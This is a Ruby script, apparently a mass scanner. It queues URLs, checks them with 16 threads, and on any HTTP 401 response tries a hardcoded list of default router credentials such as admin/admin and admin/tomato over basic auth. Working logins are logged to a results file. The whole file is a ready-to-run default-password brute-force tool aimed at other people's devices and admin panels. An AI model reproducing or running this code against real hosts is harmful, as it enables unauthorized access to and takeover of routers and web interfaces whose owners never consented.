require 'typhoeus'
require 'thread'
require 'colorize'

class CheckUrl

  def initialize
    @queue = Queue.new
    @timeout = 5
    @thread_num = 16
    @end_str = 'end'
    @thread_list = []

    @password_list = [
      ['admin', 'admin'],
      ['admin', 'tomato'],
      ['admin', '111111'],
      ['admin', '666666'],
      ['admin', '888888'],
    ]

    @result_file = File.open('./ress', 'a+')
  end

  def check_url
    while (url = @queue.pop)
      break if url == @end_str
      _check_url url
    end
  end

  def _check_url url
    r = Typhoeus.get(url, timeout: @timeout)
    if r.timed_out?
      status = 'timeout'
    else
      status = r.code
    end
    print "#{url} -- #{status}\n"

    if status.to_i == 401
      print "start basic auth for #{url} \n"
      basic_auth url
    end

  end
  
  def add_url url
    @queue.push url
  end
 
  def end
    1.upto(@thread_num * 2) do |x|
      @queue.push @end_str
    end
  end

  def wait
    @thread_list.map(&:join)
  end

  def check
    1.upto(@thread_num) do |x|
      @thread_list << Thread.new { check_url }
    end
  end

  def basic_auth url
    @password_list.each do |x|
      user = x[0]
      passwd = x[1]
      r = Typhoeus.get(url, userpwd: "#{user}:#{passwd}")
      if r.code.to_i == 200
        msg = "check for #{url} username: #{user} password: #{passwd} result : #{r.code}\n"
        print msg.red
        @result_file.write msg
        @result_file.flush
        break
      else
        print "check for #{url} username: #{user} password: #{passwd} result : #{r.code}\n"
      end
    end
  end

end

